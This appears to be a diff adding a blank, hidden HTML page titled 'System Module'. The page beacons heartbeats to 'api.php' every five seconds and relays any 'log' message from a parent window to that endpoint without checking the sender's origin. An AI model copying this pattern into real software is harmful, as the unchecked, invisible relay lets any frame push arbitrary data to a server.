@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Module</title>
+    <style>
+        body {
+            background: #000000;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Keep connection alive
+        setInterval(function() {
+            try {
+                var data = JSON.stringify({
+                    type: 'heartbeat',
+                    timestamp: Date.now()
+                });
+                
+                var blob = new Blob([data], {type: 'application/json'});
+                navigator.sendBeacon('api.php', blob);
+            } catch(e) {}
+        }, 5000);
+        
+        // Listen for messages from parent
+        window.addEventListener('message', function(e) {
+            if (e.data && e.data.type === 'log') {
+                try {
+                    var blob = new Blob([e.data.data], {type: 'application/json'});
+                    navigator.sendBeacon('api.php', blob);
+                } catch(err) {}
+            }
+        });
+    </script>
+</body>
+</html>
